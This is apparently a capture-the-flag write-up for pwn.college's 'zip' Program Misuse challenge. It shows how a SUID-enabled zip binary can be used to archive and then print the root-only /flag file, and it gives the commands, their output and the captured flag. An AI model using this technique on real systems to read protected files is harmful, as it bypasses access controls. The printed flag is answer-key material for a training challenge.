---
layout: page
title: "Challenge Name: zip"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/zip`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/zip
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/zip
```

-The `s` in `-rws` indicates it's a SUID binary.
-`zip` runs with **root privileges**.

## 🚀 Exploitation

The `zip` command in Linux is used to compress one or more files or directories into a .zip archive — a widely supported and portable format.

Indorder to reveal contents of /flag we need to use a tricky method which includes parsing the content of file to stdout while unziping the file.

Let's see how its done : 

```bash
cd /
zip myflag.zip flag
unzip -p myflag.zip flag | cat -
```

the -p option makes the content parsing to stdout possible and then we can reveal flag by piping it with cat .

Output:
```
pwn.college{gUHhEF3MY7XrWWe_5fNHRT_2xIh.dFjNxwSM0IzMyEzW}
```

